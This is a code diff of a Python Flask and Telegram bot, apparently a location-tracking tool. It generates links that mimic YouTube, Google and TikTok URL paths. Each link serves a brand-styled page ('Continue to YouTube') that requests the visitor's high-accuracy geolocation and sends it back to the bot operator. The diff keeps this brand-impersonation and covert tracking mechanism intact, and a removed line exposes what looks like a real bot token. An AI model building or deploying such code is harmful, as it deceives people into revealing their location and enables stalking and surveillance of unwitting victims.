@@ -7,24 +7,16 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler
 
 # Configuration
-TELEGRAM_TOKEN = os.environ.get('8795586906:AAE3rFi0YPQ_6NPPQFuRkiJ8sNoHLmJ4VlI')
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
 if not TELEGRAM_TOKEN:
     raise ValueError("No TELEGRAM_TOKEN set")
 
 BASE_URL = os.environ.get('BASE_URL', 'https://your-bot-name.onrender.com')
 
-# Fake domain paths that look real
+# Brand Templates
 FAKE_DOMAINS = {
     'youtube': {
         'path': 'youtube.com/watch',
-        'name': 'YouTube',
-        'icon': '▶️',
-        'color': '#FF0000',
-        'gradient': 'linear-gradient(135deg, #FF0000 0%, #cc0000 100%)',
-        'favicon': 'https://www.youtube.com/favicon.ico'
-    },
-    'youtube_short': {
-        'path': 'youtu.be',
         'name': 'YouTube',
         'icon': '▶️',
         'color': '#FF0000',
@@ -35,14 +27,6 @@ FAKE_DOMAINS = {
         'path': 'google.com',
         'name': 'Google',
         'icon': '🔍',
-        'color': '#4285F4',
-        'gradient': 'linear-gradient(135deg, #4285F4 0%, #34A853 33%, #FBBC05 66%, #EA4335 100%)',
-        'favicon': 'https://www.google.com/favicon.ico'
-    },
-    'google_maps': {
-        'path': 'google.com/maps',
-        'name': 'Google Maps',
-        'icon': '🗺️',
         'color': '#4285F4',
         'gradient': 'linear-gradient(135deg, #4285F4 0%, #34A853 33%, #FBBC05 66%, #EA4335 100%)',
         'favicon': 'https://www.google.com/favicon.ico'
@@ -86,38 +70,6 @@ FAKE_DOMAINS = {
         'color': '#000000',
         'gradient': 'linear-gradient(135deg, #ff0050 0%, #00f2ea 100%)',
         'favicon': 'https://www.tiktok.com/favicon.ico'
-    },
-    'linkedin': {
-        'path': 'linkedin.com',
-        'name': 'LinkedIn',
-        'icon': '💼',
-        'color': '#0A66C2',
-        'gradient': 'linear-gradient(135deg, #0A66C2 0%, #004182 100%)',
-        'favicon': 'https://www.linkedin.com/favicon.ico'
-    },
-    'netflix': {
-        'path': 'netflix.com',
-        'name': 'Netflix',
-        'icon': '🎬',
-        'color': '#E50914',
-        'gradient': 'linear-gradient(135deg, #E50914 0%, #B20710 100%)',
-        'favicon': 'https://www.netflix.com/favicon.ico'
-    },
-    'spotify': {
-        'path': 'spotify.com',
-        'name': 'Spotify',
-        'icon': '🎵',
-        'color': '#1DB954',
-        'gradient': 'linear-gradient(135deg, #1DB954 0%, #191414 100%)',
-        'favicon': 'https://www.spotify.com/favicon.ico'
-    },
-    'amazon': {
-        'path': 'amazon.com',
-        'name': 'Amazon',
-        'icon': '🛒',
-        'color': '#FF9900',
-        'gradient': 'linear-gradient(135deg, #FF9900 0%, #232F3E 100%)',
-        'favicon': 'https://www.amazon.com/favicon.ico'
     }
 }
 
@@ -153,7 +105,6 @@ def init_db():
 
 init_db()
 
-# Generate fake-domain link
 def generate_link(user_id, website_url, brand, chat_id):
     link_id = secrets.token_urlsafe(16)
     conn = sqlite3.connect('location_tracker.db')
@@ -163,17 +114,12 @@ def generate_link(user_id, website_url, brand, chat_id):
     conn.commit()
     conn.close()
     
-    # Get the fake domain path
     brand_info = FAKE_DOMAINS.get(brand, FAKE_DOMAINS['google'])
     fake_path = brand_info['path']
-    
-    # Generate link that looks like a real website URL
     return f"{BASE_URL}/{fake_path}/{link_id}"
 
-# Flask route to handle fake domain paths
 @app.route('/<path:fake_path>/<link_id>')
 def fake_domain_track(fake_path, link_id):
-    # Find which brand matches this path
     brand = None
     for key, value in FAKE_DOMAINS.items():
         if value['path'] == fake_path:
@@ -181,7 +127,6 @@ def fake_domain_track(fake_path, link_id):
             break
     
     if not brand:
-        # Try to match by checking if fake_path contains any brand path
         for key, value in FAKE_DOMAINS.items():
             if value['path'] in fake_path:
                 brand = key
@@ -202,7 +147,6 @@ def fake_domain_track(fake_path, link_id):
     website_url, status = result
     brand_info = FAKE_DOMAINS[brand]
     
-    # Return branded HTML page with fake domain in title
     return f'''
     <!DOCTYPE html>
     <html>
@@ -212,11 +156,7 @@ def fake_domain_track(fake_path, link_id):
         <title>{brand_info['name']}</title>
         <link rel="icon" href="{brand_info['favicon']}">
         <style>
-            * {{
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }}
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
             body {{
                 font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                 background: {brand_info['gradient']};
@@ -235,29 +175,9 @@ def fake_domain_track(fake_path, link_id):
                 box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                 text-align: center;
             }}
-            .brand-icon {{
-                font-size: 80px;
-                margin-bottom: 10px;
-            }}
-            .brand-name {{
-                color: {brand_info['color']};
-                font-size: 28px;
-                font-weight: bold;
-            }}
-            .fake-url {{
-                color: #666;
-                font-size: 12px;
-                background: #f5f5f5;
-                padding: 8px;
-                border-radius: 5px;
-                margin: 10px 0 20px 0;
-                font-family: monospace;
-            }}
-            .subtitle {{
-                color: #666;
-                margin: 10px 0 30px 0;
-                font-size: 16px;
-            }}
+            .brand-icon {{ font-size: 80px; margin-bottom: 10px; }}
+            .brand-name {{ color: {brand_info['color']}; font-size: 28px; font-weight: bold; }}
+            .subtitle {{ color: #666; margin: 10px 0 30px 0; font-size: 16px; }}
             .status {{
                 background: #f0f0f0;
                 padding: 15px;
@@ -291,31 +211,15 @@ def fake_domain_track(fake_path, link_id):
                 margin-top: 15px;
                 display: none;
             }}
-            .btn:hover {{
-                opacity: 0.9;
-            }}
-            .privacy {{
-                color: #999;
-                font-size: 12px;
-                margin-top: 20px;
-            }}
-            .url-bar {{
-                background: #f8f9fa;
-                padding: 10px;
-                border-radius: 8px;
-                margin: 15px 0;
-                font-size: 12px;
-                color: #555;
-                border: 1px solid #e9ecef;
-            }}
+            .btn:hover {{ opacity: 0.9; }}
+            .privacy {{ color: #999; font-size: 12px; margin-top: 20px; }}
         </style>
     </head>
     <body>
         <div class="container">
             <div class="brand-icon">{brand_info['icon']}</div>
             <div class="brand-name">{brand_info['name']}</div>
-            <div class="url-bar">🔗 {fake_path}/{link_id[:8]}...</div>
-            <div class="subtitle">You are being redirected</div>
+            <div class="subtitle">Continue to {brand_info['name']}</div>
             <div class="status" id="status">📍 Requesting location...</div>
             <div class="loading" id="loader"></div>
             <button class="btn" id="retryBtn" onclick="retryLocation()">🔄 Retry</button>
@@ -332,7 +236,6 @@ def fake_domain_track(fake_path, link_id):
             
             function sendLocation(position) {{
                 const {{latitude, longitude, accuracy}} = position.coords;
-                
                 statusEl.textContent = '✅ Location captured! Redirecting...';
                 statusEl.style.background = '#4CAF50';
                 statusEl.style.color = 'white';
@@ -387,16 +290,14 @@ def fake_domain_track(fake_path, link_id):
                     statusEl.style.color = '#555';
                     loader.style.display = 'inline-block';
                     retryBtn.style.display = 'none';
-                    
-                    navigator.geolocation.getCurrentPosition(
-                        sendLocation,
-                        handleError,
-                        {{enableHighAccuracy: true, timeout: 15000, maximumAge: 0}}
-                    );
+                    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {{
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }});
                 }}
             }}
             
-            // Start location request
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(sendLocation, handleError, {{
                     enableHighAccuracy: true,
@@ -462,12 +363,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = []
     brand_list = list(FAKE_DOMAINS.keys())
     
-    # Create rows of 2 buttons
     for i in range(0, len(brand_list), 2):
         row = []
         for brand in brand_list[i:i+2]:
             brand_info = FAKE_DOMAINS[brand]
-            # Show the fake domain path in button
             display_name = f"{brand_info['icon']} {brand_info['name']} ({brand_info['path']})"
             row.append(InlineKeyboardButton(
                 display_name,
@@ -548,7 +447,6 @@ async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    # Show brand selection again
     keyboard = []
     brand_list = list(FAKE_DOMAINS.keys())
     for i in range(0, len(brand_list), 2):
